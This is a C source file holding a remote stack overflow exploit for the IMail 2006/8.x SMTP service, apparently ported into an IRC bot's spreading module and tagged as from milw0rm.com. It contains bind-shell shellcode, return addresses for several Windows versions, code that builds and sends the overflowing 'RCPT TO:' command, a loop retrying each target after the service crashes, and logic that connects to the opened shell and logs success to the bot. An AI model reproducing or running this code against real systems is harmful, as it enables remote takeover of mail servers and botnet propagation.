#include "includes.h"

#ifndef NO_IPSWITCH

//IMail 2006 and 8.x SMTP 'RCPT TO:' Stack Overflow Exploit
//Ported to reptile by sZ.

// PAYLOADS
// Restricted Chars = 0x00 0x0D 0x0A 0x20 0x3e 0x22 (Maybe More)


/* win32_bind -  EXITFUNC=seh LPORT=6236 Size=342 Encoder=PexFnstenvMov http://metasploit.com */
char Win32Bind[] =
"\x6a\x50\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x0f\x8c\x6f"
"\xb2\x83\xeb\xfc\xe2\xf4\xf3\xe6\x84\xff\xe7\x75\x90\x4d\xf0\xec"
"\xe4\xde\x2b\xa8\xe4\xf7\x33\x07\x13\xb7\x77\x8d\x80\x39\x40\x94"
"\xe4\xed\x2f\x8d\x84\xfb\x84\xb8\xe4\xb3\xe1\xbd\xaf\x2b\xa3\x08"
"\xaf\xc6\x08\x4d\xa5\xbf\x0e\x4e\x84\x46\x34\xd8\x4b\x9a\x7a\x69"
"\xe4\xed\x2b\x8d\x84\xd4\x84\x80\x24\x39\x50\x90\x6e\x59\x0c\xa0"
"\xe4\x3b\x63\xa8\x73\xd3\xcc\xbd\xb4\xd6\x84\xcf\x5f\x39\x4f\x80"
"\xe4\xc2\x13\x21\xe4\xf2\x07\xd2\x07\x3c\x41\x82\x83\xe2\xf0\x5a"
"\x09\xe1\x69\xe4\x5c\x80\x67\xfb\x1c\x80\x50\xd8\x90\x62\x67\x47"
"\x82\x4e\x34\xdc\x90\x64\x50\x05\x8a\xd4\x8e\x61\x67\xb0\x5a\xe6"
"\x6d\x4d\xdf\xe4\xb6\xbb\xfa\x21\x38\x4d\xd9\xdf\x3c\xe1\x5c\xdf"
"\x2c\xe1\x4c\xdf\x90\x62\x69\xe4\x77\xee\x69\xdf\xe6\x53\x9a\xe4"
"\xcb\xa8\x7f\x4b\x38\x4d\xd9\xe6\x7f\xe3\x5a\x73\xbf\xda\xab\x21"
"\x41\x5b\x58\x73\xb9\xe1\x5a\x73\xbf\xda\xea\xc5\xe9\xfb\x58\x73"
"\xb9\xe2\x5b\xd8\x3a\x4d\xdf\x1f\x07\x55\x76\x4a\x16\xe5\xf0\x5a"
"\x3a\x4d\xdf\xea\x05\xd6\x69\xe4\x0c\xdf\x86\x69\x05\xe2\x56\xa5"
"\xa3\x3b\xe8\xe6\x2b\x3b\xed\xbd\xaf\x41\xa5\x72\x2d\x9f\xf1\xce"
"\x43\x21\x82\xf6\x57\x19\xa4\x27\x07\xc0\xf1\x3f\x79\x4d\x7a\xc8"
"\x90\x64\x54\xdb\x3d\xe3\x5e\xdd\x05\xb3\x5e\xdd\x3a\xe3\xf0\x5c"
"\x07\x1f\xd6\x89\xa1\xe1\xf0\x5a\x05\x4d\xf0\xbb\x90\x62\x84\xdb"
"\x93\x31\xcb\xe8\x90\x64\x5d\x73\xbf\xda\xff\x06\x6b\xed\x5c\x73"
"\xb9\x4d\xdf\x8c\x6f\xb2";

BOOL smtproot(char *target, void* conn,EXINFO exinfo, int tos)
{

   IRC* irc=(IRC*)conn;
   static char overflow[1028];

   WSADATA wsaData;

   struct hostent *hp;
   struct sockaddr_in sockin;
   char buf[300], *check;
   int sockfd, bytes;
   int plen, i;

   

   	if (WSAStartup(MAKEWORD(1, 1), &wsaData) < 0)
   	{
    	//fprintf(stderr, "Error setting up with WinSock v1.1\n");
      	return false;
   	}


   	hp = gethostbyname(exinfo.ip);
   	if (hp == NULL)
   	{
      	//printf("ERROR: Uknown host %s\n", exinfo.ip);
	  	//printf("%s",exinfo.ip);
      	return false;
   	}

   	sockin.sin_family = hp->h_addrtype;
   	sockin.sin_port = htons(exinfo.port);
   	sockin.sin_addr = *((struct in_addr *)hp->h_addr);

   	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)
   	{
      	//printf("ERROR: Socket Error\n");
      	return false;
   	}

   	if ((connect(sockfd, (struct sockaddr *) &sockin,
                sizeof(sockin))) == SOCKET_ERROR)
   	{
      	//printf("ERROR: Connect Error\n");
      	closesocket(sockfd);
      	WSACleanup();
      	return false;;
   	}

   	//printf("Connected to [%s] on port [%d], sending overflow....\n",
    //     exinfo.ip, port);


   	if ((bytes = recv(sockfd, buf, 300, 0)) == SOCKET_ERROR)
   	{
      	//printf("ERROR: Recv Error\n");
      	closesocket(sockfd);
      	WSACleanup();
      	return false;
   	}

   	/* wait for SMTP service welcome*/
   	buf[bytes] = '\0';
   	check = strstr(buf, "220");
   	if (check == NULL)
   	{
      	//printf("ERROR: NO  response from SMTP service\n");
      	closesocket(sockfd);
      	WSACleanup();
		return false;
   	}


   // JMP to EAX = Results in a Corrupted Stack
   // so instead we POP EBP, RET to restore pointer and then return
   // this causes code procedure to continue
   /*
   		['IMail 8.x Universal', 0x10036f71 ],
		['Windows 2003 SP1 English', 0x7c87d8af ],
		['Windows 2003 SP0 English', 0x77d5c14c ],
		['Windows XP SP2 English', 0x7c967e23 ],
		['Windows XP SP1 English', 0x71ab389c ],
		['Windows XP SP0 English', 0x71ab389c ],
		['Windows 2000 Universal English', 0x75021397 ],
		['Windows 2000 Universal French', 0x74fa1397],
		['Windows XP SP1 - SP2 German', 0x77d18c14],
	*/
   	char Exp[] = "RCPT TO: <@";						// This stores our JMP between the @ and :
   	char Win2k3SP1E[] = "\xaf\xd8\x87\x7c:";		//Win2k3 SP1 English NTDLL.DLL [pop ebp, ret] 0x7c87d8af
  	char WinXPSP2E[] = "\x23\x7e\x96\x7c:";			//WinXP SP2 English  NTDLL.DLL [pop ebp, ret] 0x7c967e23
   	char IMail815[] = "\x71\x6f\x03\x10:"; 			//IMAIL 8.15 SMTPDLL.DLL	   [pop ebp, ret] 0x10036f71
	char Win2k3SP0E[] = "\x4c\xc1\xd5\x77:";		//Win2k3 SP0 English USER32.DLL [pop ebp, ret]0x77d5c14c
	char WinXPSP2[] = "\x23\x7e\x96\x7c:";			//WinXP SP2 English USER32.DLL [pop ebp, ret] 0x7c967e23
	char WinXPSP1[] = "\x9c\x38\xab\x71:";			//WinXP SP1 and 0 English U32	[pop ebp, ret]0x71ab389c
	char Win2KE[] = "\x97\x31\x02\x75:";			//Win2k English All SPs			[pop ebp, ret]0x75021397
	char Win2KF[] = "\x97\x13\xfa\x74:";			// As above except French Win2k	[pop ebp, ret]0x74fa1397
	char WinXPG[] = "\x14\x8c\xd1\x77:";			//WinXP SP1 - SP2 German U32    [pop ebp, ret]0x77d18c14

	char tail[] = "SSS>\n";							// This closes the RCPT cmd.  Any characters work.
	// Another overflow can be achieved by using an overly long buffer after RCPT TO: on 8.15 systems
	// After around 560 bytes or so EIP gets overwritten.  But this method is easier to exploit and it works
	// On all versions from 8.x to 2006 (9.x?)
	char StackS[] = "\x81\xc4\xff\xef\xff\xff\x44";	// Stabolize Stack prior to payload.
   	memset(overflow, 0, 1028);
   	strcat(overflow, Exp);



	//New method, try all opcodes.
	if (tos == 1) { strcat(overflow, IMail815); }
	if (tos == 2) { strcat(overflow, Win2KE); }
	if (tos == 3) { strcat(overflow, Win2k3SP1E); }
	if (tos == 4) { strcat(overflow, Win2k3SP0E); }
	if (tos == 5) { strcat(overflow, WinXPSP2); }
	if (tos == 6) { strcat(overflow, WinXPSP1); }		
	if (tos == 7) { strcat(overflow, Win2KF); }			
	if (tos == 8) { strcat(overflow, WinXPG); }			
	if (tos == 9) { strcat(overflow, WinXPSP2E); }

	plen = 544 - ((strlen(Win32Bind) + strlen(StackS)));

		for (i=0; i<plen; i++){
			strcat(overflow, "\x90");
		}
		strcat(overflow, StackS);
		strcat(overflow, Win32Bind);


	// Dont forget to add the trailing characters to set up stack overflow
	strcat(overflow, tail);



	// Connect to SMTP Server and Setup Up Email
   	char EHLO[] = "EHLO \r\n";
   	char MF[] = "MAIL FROM <TEST@TEST> \r\n";
   	send(sockfd, EHLO, strlen(EHLO), 0);
   	Sleep(1000);
   	send(sockfd, MF, strlen(MF), 0);
   	Sleep(1000);


   	if (send(sockfd, overflow, strlen(overflow),0) == SOCKET_ERROR)
   	{
		//printf("ERROR: Send Error\n");
      	closesocket(sockfd);
      	WSACleanup();
      	return false;
  	}

  	//printf("Exploit Sent.....\r\n");
	//if (atoi(argv[3]) == 3)
	//{
		//printf("Check Shell on Port 4444\n");
		closesocket(sockfd);
      	WSACleanup();
      	//exit(0);
	//}

	//printf("Checking If Exploit Executed....\r\n");
	Sleep(1000);
	closesocket(sockfd);

	sockin.sin_family = hp->h_addrtype;
   	sockin.sin_port = htons(exinfo.port);
   	sockin.sin_addr = *((struct in_addr *)hp->h_addr);

   	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)
   	{
      	//printf("ERROR: Socket Error\n");
      	return false;
   	}

   	if ((connect(sockfd, (struct sockaddr *) &sockin,sizeof(sockin))) == SOCKET_ERROR)
   	{
      	//printf("Exploit Successfully Delivered!\n");
		closesocket(sockfd);
		WSACleanup();
		//printf("Don't Forget to Restart the IMAIL SMTP Service to Re-exploit!");
		//exit(0);
   	}
	//printf("...");
	if ((bytes = recv(sockfd, buf, 300, 0)) == SOCKET_ERROR)
   	{
      	//printf("Exploit Successfully Delivered!\n");
		closesocket(sockfd);
		WSACleanup();
		//printf("Don't Forget to Restart the IMAIL SMTP Service to Re-exploit!");
		//exit(0);
   	}

   	/* wait for SMTP service welcome*/
   	buf[bytes] = '\0';
   	check = strstr(buf, "220");
   	if (check == NULL)
   	{
      	//printf("Exploit Successfully Delivered!\n");
		closesocket(sockfd);
		WSACleanup();
		//printf("Don't Forget to Restart the IMAIL SMTP Service to Re-exploit!");
		//exit(0);
   	}

	//printf("Exploit Failed: Try A different JMP Method or Payload\n");

	closesocket(sockfd);
  	WSACleanup();
	//end of the line. connect to our shell or fail
	if (ConnectShell(exinfo,bindport)) {
		sprintf(buffer, "%s %s: Exploiting IP: %s [opcode %d]", scan_title, exploit[exinfo.exploit].name, exinfo.ip, tos);
		exploit[exinfo.exploit].stats++;
		return true;
	}
  	return false;
}


BOOL ipswitch(char *target, void* conn,EXINFO exinfo)
{
//try all the opcodes with a PURPOSEFULLY BIG delay between attempts, it crashes the service which restarts automaticly after 3-5 minutes..
BOOL success = FALSE;
success = smtproot(target,conn,exinfo,1);
Sleep(720000);
success = smtproot(target,conn,exinfo,2);
Sleep(720000);
success = smtproot(target,conn,exinfo,3);
Sleep(720000);
success = smtproot(target,conn,exinfo,4);
Sleep(720000);
success = smtproot(target,conn,exinfo,5);
Sleep(720000);
success = smtproot(target,conn,exinfo,6);
Sleep(720000);
success = smtproot(target,conn,exinfo,7);
Sleep(720000);
success = smtproot(target,conn,exinfo,8);
Sleep(720000);
success = smtproot(target,conn,exinfo,9);
Sleep(720000);
if (success) { return true; }
else { return false; }
}



#endif
// milw0rm.com [2006-10-19]

